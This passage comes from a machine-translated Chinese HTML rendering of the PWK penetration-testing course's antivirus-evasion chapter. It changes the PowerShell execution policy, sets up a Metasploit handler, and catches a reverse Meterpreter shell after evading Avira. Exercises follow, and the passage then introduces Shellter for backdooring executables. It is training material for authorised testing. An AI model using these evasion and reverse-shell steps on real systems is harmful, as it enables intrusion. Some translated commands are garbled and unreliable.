<div style="position:absolute;top:72565;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">PWK 2.0</font></font></nobr></div>
<div style="position:absolute;top:72565;left:318"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">版权所有 © Offensive Security Ltd. 保留所有权利。</font></font></nobr></div>
<div style="position:absolute;top:72565;left:791"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">502</font></font></nobr></div>
</span></font>
<font size="3" face="Times"><span style="font-size:11px;font-family:Times">
<div style="position:absolute;top:71849;left:294"><nobr><i><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">图 268：对恶意 PowerShell 脚本的 Avira 扫描</font></font></i></nobr></div>
</span></font>
<font size="3" face="Times"><span style="font-size:14px;font-family:Times">
<div style="position:absolute;top:71880;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">不幸的是，当我们尝试运行我们的恶意脚本时，我们会看到一个错误</font></font></nobr></div>
<div style="position:absolute;top:71900;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">引用了</font><font style="vertical-align: inherit;">我们系统</font><font style="vertical-align: inherit;">的</font></font><i><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">执行策略</font></font></i><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">，这些</font><i><font style="vertical-align: inherit;">策略</font></i><font style="vertical-align: inherit;">似乎阻止了我们的脚本运行：</font></font></nobr></div>
</span></font>
<font size="3" face="Times"><span style="font-size:11px;font-family:Times">
<div style="position:absolute;top:71934;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">C:\Users\offsec\Desktop&gt;</font></font><b><font color="#0070c0"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">目录</font></font></font></b></nobr></div>
<div style="position:absolute;top:71951;left:117"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">驱动器 C 中的卷没有标签。</font></font></nobr></div>
<div style="position:absolute;top:71968;left:117"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">卷序列号为 56B9-BB74</font></font></nobr></div>
<div style="position:absolute;top:72002;left:117"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">C:\Users\offsec\Desktop 目录</font></font></nobr></div>
<div style="position:absolute;top:72036;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">02/27/2018 05:16 AM &lt;目录&gt;    </font></font></nobr></div>
<div style="position:absolute;top:72036;left:425"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">.</font></font></nobr></div>
<div style="position:absolute;top:72053;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">02/27/2018 05:16 AM &lt;目录&gt;    </font></font></nobr></div>
<div style="position:absolute;top:72053;left:425"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">..</font></font></nobr></div>
<div style="position:absolute;top:72070;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">02/27/2018 05:09 AM    </font></font></nobr></div>
<div style="position:absolute;top:72070;left:376"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">2,454 av_test.ps1</font></font></nobr></div>
<div style="position:absolute;top:72087;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">2018/02/26 05:55    </font></font></nobr></div>
<div style="position:absolute;top:72087;left:392"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">799 Windows 10 更新助手.lnk</font></font></nobr></div>
<div style="position:absolute;top:72104;left:230"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">3 个文件    </font></font></nobr></div>
<div style="position:absolute;top:72104;left:384"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">4,299 字节</font></font></nobr></div>
<div style="position:absolute;top:72121;left:230"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">3 目录 5,306,019,840 字节空闲</font></font></nobr></div>
<div style="position:absolute;top:72155;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">C:\Users\offsec\Desktop&gt; </font></font><b><font color="#0070c0"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">powershell .\av_test.ps1</font></font></font></b></nobr></div>
<div style="position:absolute;top:72172;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">.\av_test.ps1 : 文件 C:\Users\offsec\Desktop\av_test.ps1 无法加载，因为运行</font></font></nobr></div>
<div style="position:absolute;top:72189;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">ing 脚本在此被禁用</font></font></nobr></div>
<div style="position:absolute;top:72206;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">系统。</font><font style="vertical-align: inherit;">欲了解更多信息，请参阅about_ </font></font><b><font color="#c00000"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">Execution_Policies</font></font></font></b><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">在http://go.microsoft.com/</font></font></nobr></div>
<div style="position:absolute;top:72223;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">fwlink/?LinkID=135170。</font></font></nobr></div>
<div style="position:absolute;top:72240;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">在行：1 字符：1</font></font></nobr></div>
<div style="position:absolute;top:72257;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">+ .\av_test.ps1</font></font></nobr></div>
<div style="position:absolute;top:72274;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">+ ~~~~~~~~~~~~~</font></font></nobr></div>
<div style="position:absolute;top:72291;left:141"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">+ 分类信息    </font></font></nobr></div>
<div style="position:absolute;top:72291;left:336"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">: SecurityError: (:) [], PSSecurityException</font></font></nobr></div>
<div style="position:absolute;top:72307;left:141"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">+ FullQualifiedErrorId : UnauthorizedAccess</font></font></nobr></div>
<div style="position:absolute;top:72327;left:211"><nobr><i><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">清单 504 - 尝试运行脚本并遇到执行策略错误</font></font></i></nobr></div>
</span></font>
<font size="3" face="Times"><span style="font-size:14px;font-family:Times">
<div style="position:absolute;top:72356;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">快速浏览有关 PowerShell 执行策略的 Microsoft 文档（链接在错误</font></font></nobr></div>
<div style="position:absolute;top:72376;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">message) 显示这些策略是基于每个用户而不是每个系统设置的。 </font></font></nobr></div>
</span></font>

<div style="position:absolute;top:72643;left:0"><hr><table border="0" width="100%"><tbody><tr><td bgcolor="eeeeee" align="right"><font face="arial,sans-serif"><a name="62"><b><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">第 62 页</font></font></b></a></font></td></tr></tbody></table></div><font size="2" face="Times"><span style="font-size:9px;font-family:Times">
<div style="position:absolute;top:72676;left:611"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">使用 Kali Linux 2.0 进行渗透测试</font></font></nobr></div>
<div style="position:absolute;top:73753;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">PWK 2.0</font></font></nobr></div>
<div style="position:absolute;top:73753;left:318"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">版权所有 © Offensive Security Ltd. 保留所有权利。</font></font></nobr></div>
<div style="position:absolute;top:73753;left:791"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">503</font></font></nobr></div>
</span></font>
<font size="2" color="#ffffff" face="Times"><span style="font-size:5px;font-family:Times;color:#ffffff">
<div style="position:absolute;top:72766;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">17.3.3.1.1</font></font></nobr></div>
</span></font>
<font size="3" color="#0070c0" face="Times"><span style="font-size:14px;font-family:Times;color:#0070c0">
<div style="position:absolute;top:72816;left:174"><nobr><i><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">请记住，就像 Windows 中的任何东西一样，PowerShell 执行</font></font></i></nobr></div>
<div style="position:absolute;top:72835;left:174"><nobr><i><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">策略设置可由一个或多个 Active Directory GPO 指定。</font></font><font style="font-size:8px"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">430</font></font></font><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">在那些</font></font></i></nobr></div>
<div style="position:absolute;top:72855;left:174"><nobr><i><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">在这种情况下，可能需要寻找额外的旁路向量。</font></font></i></nobr></div>
</span></font>
<font size="3" face="Times"><span style="font-size:14px;font-family:Times">
<div style="position:absolute;top:72917;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">让我们尝试查看和更改当前用户的策略。</font><font style="vertical-align: inherit;">请注意，在这种情况下</font></font></nobr></div>
<div style="position:absolute;top:72936;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">我们选择更改策略而不是在每个脚本的基础上绕过它，这可以</font></font></nobr></div>
<div style="position:absolute;top:72955;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">通过在</font><font style="vertical-align: inherit;">运行时为每个脚本</font><font style="vertical-align: inherit;">使用</font></font><b><font color="#c00000" style="font-size:11px"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">-ExecutionPolicy Bypass</font></font></font></b><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">标志来</font><font style="vertical-align: inherit;">实现</font><font style="vertical-align: inherit;">。</font></font></nobr></div>
</span></font>
<font size="3" face="Times"><span style="font-size:11px;font-family:Times">
<div style="position:absolute;top:72990;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">C:\Users\offsec\Desktop&gt; </font></font><b><font color="#0070c0"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">powershell</font></font></font></b></nobr></div>
<div style="position:absolute;top:73007;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">Windows PowerShell</font></font></nobr></div>
<div style="position:absolute;top:73024;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">版权所有 (C) 2015 Microsoft Corporation。</font><font style="vertical-align: inherit;">版权所有。</font></font></nobr></div>
<div style="position:absolute;top:73058;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">PS C:\Users\offsec\Desktop&gt; </font></font><b><font color="#0070c0"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">Get-ExecutionPolicy -Scope CurrentUser</font></font></font></b></nobr></div>
</span></font>
<font size="3" color="#c00000" face="Times"><span style="font-size:11px;font-family:Times;color:#c00000">
<div style="position:absolute;top:73075;left:109"><nobr><b><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">不明确的</font></font></b></nobr></div>
</span></font>
<font size="3" face="Times"><span style="font-size:11px;font-family:Times">
<div style="position:absolute;top:73109;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">PS C:\Users\offsec\Desktop&gt; </font></font><b><font color="#0070c0"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">Set-ExecutionPolicy -ExecutionPolicy Unrestricted -Scope C</font></font></font></b></nobr></div>
</span></font>
<font size="3" color="#0070c0" face="Times"><span style="font-size:11px;font-family:Times;color:#0070c0">
<div style="position:absolute;top:73126;left:109"><nobr><b><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">当前用户</font></font></b></nobr></div>
</span></font>
<font size="3" face="Times"><span style="font-size:11px;font-family:Times">
<div style="position:absolute;top:73160;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">PS C:\Users\offsec\Desktop&gt; </font></font><b><font color="#0070c0"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">Get-ExecutionPolicy -Scope CurrentUser</font></font></font></b></nobr></div>
</span></font>
<font size="3" color="#c00000" face="Times"><span style="font-size:11px;font-family:Times;color:#c00000">
<div style="position:absolute;top:73177;left:109"><nobr><b><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">无限制</font></font></b></nobr></div>
</span></font>
<font size="3" face="Times"><span style="font-size:11px;font-family:Times">
<div style="position:absolute;top:73196;left:280"><nobr><i><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">清单 505 - 更改当前用户的 ExecutionPolicy</font></font></i></nobr></div>
</span></font>
<font size="3" face="Times"><span style="font-size:14px;font-family:Times">
<div style="position:absolute;top:73226;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">上面的清单显示我们已成功将当前用户的策略更改为</font></font></nobr></div>
<div style="position:absolute;top:73245;left:109"><nobr><i><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">无限制</font></font></i><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">。</font><font style="vertical-align: inherit;">在执行我们的脚本之前，我们将在 Kali 攻击者上启动一个 Meterpreter 处理程序</font></font></nobr></div>
<div style="position:absolute;top:73265;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">机器与我们的外壳交互：</font></font></nobr></div>
</span></font>
<font size="3" face="Times"><span style="font-size:11px;font-family:Times">
<div style="position:absolute;top:73299;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">msf 漏洞利用（多/处理程序）&gt;</font></font><b><font color="#0070c0"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">显示选项</font></font></font></b></nobr></div>
<div style="position:absolute;top:73333;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">模块选项（exploit/multi/handler）：</font></font></nobr></div>
<div style="position:absolute;top:73367;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">名称 当前设置 必需 描述</font></font></nobr></div>
<div style="position:absolute;top:73384;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">---- --------------- -------- -----------</font></font></nobr></div>
<div style="position:absolute;top:73435;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">有效负载选项（windows/meterpreter/reverse_tcp）：</font></font></nobr></div>
<div style="position:absolute;top:73469;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">名称 当前设置 必需 描述</font></font></nobr></div>
<div style="position:absolute;top:73486;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">---- --------------- -------- -----------</font></font></nobr></div>
<div style="position:absolute;top:73503;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">退出进程    </font></font></nobr></div>
<div style="position:absolute;top:73503;left:328"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">是 退出技术（接受：''、seh、线程、进程</font></font></nobr></div>
<div style="position:absolute;top:73520;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">主机 10.11.0.4    </font></font></nobr></div>
<div style="position:absolute;top:73520;left:328"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">是 监听地址</font></font></nobr></div>
<div style="position:absolute;top:73537;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">端口 4444    </font></font></nobr></div>
<div style="position:absolute;top:73537;left:328"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">是监听端口</font></font></nobr></div>
<div style="position:absolute;top:73588;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">利用目标：</font></font></nobr></div>
<div style="position:absolute;top:73622;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">身份证名称</font></font></nobr></div>
<div style="position:absolute;top:73639;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">- - -</font></font></nobr></div>
</span></font>
<font size="2" face="Times"><span style="font-size:5px;font-family:Times">
<div style="position:absolute;top:73703;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">430 </font></font><font style="font-size:9px"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">（微软，2018 年），https://docs.microsoft.com/en-us/previous-versions/windows/desktop/policy/group-policy-objects</font></font></font></nobr></div>
</span></font>

<div style="position:absolute;top:73831;left:0"><hr><table border="0" width="100%"><tbody><tr><td bgcolor="eeeeee" align="right"><font face="arial,sans-serif"><a name="63"><b><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">第 63 页</font></font></b></a></font></td></tr></tbody></table></div><font size="2" face="Times"><span style="font-size:9px;font-family:Times">
<div style="position:absolute;top:73864;left:611"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">使用 Kali Linux 2.0 进行渗透测试</font></font></nobr></div>
<div style="position:absolute;top:74941;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">PWK 2.0</font></font></nobr></div>
<div style="position:absolute;top:74941;left:318"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">版权所有 © Offensive Security Ltd. 保留所有权利。</font></font></nobr></div>
<div style="position:absolute;top:74941;left:791"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">504</font></font></nobr></div>
</span></font>
<font size="3" face="Times"><span style="font-size:11px;font-family:Times">
<div style="position:absolute;top:73960;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">0 通配符目标</font></font></nobr></div>
<div style="position:absolute;top:74010;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">msf 漏洞利用（多/处理程序）&gt;</font></font><b><font color="#0070c0"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">漏洞利用</font></font></font></b></nobr></div>
<div style="position:absolute;top:74044;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">[*] 在 10.11.0.4:4444 上启动反向 TCP 处理程序 </font></font></nobr></div>
<div style="position:absolute;top:74064;left:258"><nobr><i><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">清单 506 - 设置处理程序与我们的 Meterpreter shell 交互</font></font></i></nobr></div>
</span></font>
<font size="3" face="Times"><span style="font-size:14px;font-family:Times">
<div style="position:absolute;top:74093;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">现在我们将尝试启动 PowerShell 脚本：</font></font></nobr></div>
</span></font>
<font size="3" face="Times"><span style="font-size:11px;font-family:Times">
<div style="position:absolute;top:74128;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">PS C:\Users\admin\Desktop&gt; </font></font><b><font color="#0070c0"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">.\av_test.ps1</font></font></font></b></nobr></div>
<div style="position:absolute;top:74162;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">IsPublic IsSerial 名称    </font></font></nobr></div>
<div style="position:absolute;top:74162;left:587"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">基本类型</font></font></nobr></div>
<div style="position:absolute;top:74179;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">———————————————    </font></font></nobr></div>
<div style="position:absolute;top:74179;left:587"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">--------</font></font></nobr></div>
<div style="position:absolute;top:74196;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">真真字节[]    </font></font></nobr></div>
<div style="position:absolute;top:74196;left:587"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">系统数组</font></font></nobr></div>
<div style="position:absolute;top:74213;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">139591680</font></font></nobr></div>
<div style="position:absolute;top:74230;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">139591681</font></font></nobr></div>
<div style="position:absolute;top:74247;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">139591682</font></font></nobr></div>
<div style="position:absolute;top:74264;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">139591683</font></font></nobr></div>
<div style="position:absolute;top:74281;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">139591684</font></font></nobr></div>
<div style="position:absolute;top:74298;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">139591685</font></font></nobr></div>
<div style="position:absolute;top:74315;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">139591686</font></font></nobr></div>
<div style="position:absolute;top:74332;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">139591687</font></font></nobr></div>
<div style="position:absolute;top:74349;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">139591688</font></font></nobr></div>
<div style="position:absolute;top:74366;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">139591689</font></font></nobr></div>
<div style="position:absolute;top:74383;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">139591690</font></font></nobr></div>
<div style="position:absolute;top:74399;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">139591691</font></font></nobr></div>
<div style="position:absolute;top:74416;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">139591692</font></font></nobr></div>
<div style="position:absolute;top:74434;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">139591693</font></font></nobr></div>
<div style="position:absolute;top:74451;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">139591694</font></font></nobr></div>
<div style="position:absolute;top:74467;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">139591695</font></font></nobr></div>
<div style="position:absolute;top:74484;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">139591696</font></font></nobr></div>
<div style="position:absolute;top:74501;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">139591697</font></font></nobr></div>
<div style="position:absolute;top:74518;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">....</font></font></nobr></div>
<div style="position:absolute;top:74538;left:336"><nobr><i><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">清单 507 - 运行 PowerShell 脚本</font></font></i></nobr></div>
</span></font>
<font size="3" face="Times"><span style="font-size:14px;font-family:Times">
<div style="position:absolute;top:74567;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">脚本执行没有任何问题，我们在我们的攻击中收到了一个 Meterpreter shell</font></font></nobr></div>
<div style="position:absolute;top:74587;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">机器：</font></font></nobr></div>
</span></font>
<font size="3" face="Times"><span style="font-size:11px;font-family:Times">
<div style="position:absolute;top:74621;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">[*] 发送阶段（179779 字节）到 10.11.0.22</font></font></nobr></div>
<div style="position:absolute;top:74638;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">[*] Meterpreter session 1 打开 (10.11.0.4:4444 -&gt; 10.11.0.22:49546)</font></font></nobr></div>
<div style="position:absolute;top:74672;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">Meterpreter &gt; </font></font><b><font color="#0070c0"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">getuid</font></font></font></b></nobr></div>
<div style="position:absolute;top:74689;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">服务器用户名：CLIENT251\offsec</font></font></nobr></div>
<div style="position:absolute;top:74708;left:264"><nobr><i><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">清单 508 - 在我们的攻击机器上接收一个 Meterpreter shell</font></font></i></nobr></div>
</span></font>
<font size="3" face="Times"><span style="font-size:14px;font-family:Times">
<div style="position:absolute;top:74738;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">这意味着我们已经有效地避开了对目标的 Avira 检测。</font></font></nobr></div>
<div style="position:absolute;top:74771;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">在成熟的组织中，</font><font style="vertical-align: inherit;">可以实施</font><font style="vertical-align: inherit;">各种机器学习</font></font><font style="font-size:8px"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">431</font></font></font><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">软件</font><font style="vertical-align: inherit;">，这些</font><font style="vertical-align: inherit;">软件将尝试</font></font></nobr></div>
<div style="position:absolute;top:74790;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">分析在系统上运行的脚本的内容。</font><font style="vertical-align: inherit;">视配置而定</font></font></nobr></div>
</span></font>
<font size="2" face="Times"><span style="font-size:5px;font-family:Times">
<div style="position:absolute;top:74877;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">431 </font></font><font style="font-size:9px"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">（微软，2109），https://www.microsoft.com/security/blog/2019/09/03/deep-learning-rises-new-methods-for-detecting-</font></font></font></nobr></div>
</span></font>
<font size="2" face="Times"><span style="font-size:9px;font-family:Times">
<div style="position:absolute;top:74892;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">恶意powershell/ </font></font></nobr></div>
</span></font>

<div style="position:absolute;top:75019;left:0"><hr><table border="0" width="100%"><tbody><tr><td bgcolor="eeeeee" align="right"><font face="arial,sans-serif"><a name="64"><b><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">第 64 页</font></font></b></a></font></td></tr></tbody></table></div><font size="2" face="Times"><span style="font-size:9px;font-family:Times">
<div style="position:absolute;top:75052;left:611"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">使用 Kali Linux 2.0 进行渗透测试</font></font></nobr></div>
<div style="position:absolute;top:76129;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">PWK 2.0</font></font></nobr></div>
<div style="position:absolute;top:76129;left:318"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">版权所有 © Offensive Security Ltd. 保留所有权利。</font></font></nobr></div>
<div style="position:absolute;top:76129;left:791"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">505</font></font></nobr></div>
</span></font>
<font size="3" face="Times"><span style="font-size:14px;font-family:Times">
<div style="position:absolute;top:75148;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">这些系统以及他们认为有害的内容，可能需要更改上述脚本</font></font></nobr></div>
<div style="position:absolute;top:75167;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">或适应目标环境。</font></font></nobr></div>
</span></font>
<font size="3" color="#0070c0" face="Times"><span style="font-size:16px;font-family:Times;color:#0070c0">
<div style="position:absolute;top:75202;left:109"><nobr><i><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">17.3.3.2 练习</font></font></i></nobr></div>
</span></font>
<font size="3" face="Times"><span style="font-size:14px;font-family:Times">
<div style="position:absolute;top:75231;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">1.查看PowerShell脚本中的代码并确保您有基本的了解</font></font></nobr></div>
<div style="position:absolute;top:75251;left:145"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">它是如何工作的。</font></font></nobr></div>
<div style="position:absolute;top:75279;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">2. 使用 PowerShell 将一个 Meterpreter shell 返回到您的 Kali Linux 机器。</font></font></nobr></div>
<div style="position:absolute;top:75308;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">3. 尝试使用 PowerShell one-liner 而不是脚本获取反向 shell。</font></font><font style="font-size:8px"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">432</font></font></font></nobr></div>
</span></font>
<font size="3" color="#0070c0" face="Times"><span style="font-size:16px;font-family:Times;color:#0070c0">
<div style="position:absolute;top:75342;left:109"><nobr><i><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">17.3.3.3 壳牌</font></font></i></nobr></div>
</span></font>
<font size="3" face="Times"><span style="font-size:14px;font-family:Times">
<div style="position:absolute;top:75376;left:109"><nobr><i><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">Shellter </font></font></i><font style="font-size:8px"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">433</font></font></font><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">是一个动态 shellcode 注入工具，也是最受欢迎的免费工具之一，能够</font></font></nobr></div>
<div style="position:absolute;top:75396;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">绕过杀毒软件。</font><font style="vertical-align: inherit;">它使用了许多新颖和先进的技术来基本上</font></font></nobr></div>
<div style="position:absolute;top:75415;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">后门具有恶意 shellcode 负载的有效且非恶意的可执行文件。</font></font></nobr></div>
<div style="position:absolute;top:75448;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">虽然 Shellter 使用的技术细节超出了本模块的范围，但它本质上是</font></font></nobr></div>
<div style="position:absolute;top:75467;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">对目标 PE 文件和执行路径进行彻底分析。</font><font style="vertical-align: inherit;">然后它确定在哪里</font></font></nobr></div>
<div style="position:absolute;top:75487;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">它可以注入我们的shellcode，而不依赖于容易被捕获的传统注入技术</font></font></nobr></div>
